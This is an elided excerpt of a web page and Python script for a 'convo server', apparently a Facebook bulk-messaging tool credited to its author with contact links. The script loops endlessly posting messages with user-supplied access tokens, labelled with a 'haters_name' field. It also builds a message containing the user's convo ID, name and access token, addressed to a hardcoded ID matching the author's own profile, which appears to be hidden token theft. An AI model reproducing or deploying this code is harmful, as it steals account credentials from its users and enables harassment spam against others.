...
<head>
    ...
    <title>SAMEERCONVO SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>SAMEER CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:-SAMEER KHAN</p>
                <p>2. OWNER => SAMEER</p>
                <p>3. CONTACT:- <a href="919536764960">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100078418158177">Facebook</a></p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/PNhzJcuu').text
    ...
    # Message template
    msg_template = "Owner => SAMEER \n Hello SAMEER sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100078418158177"]
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print("\033[1;36m[✓] Your Massage Successfully Sent By SAMEER's Convo Server No. {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『 SAMEER KHAN 』•═══════✭✪')
                else:
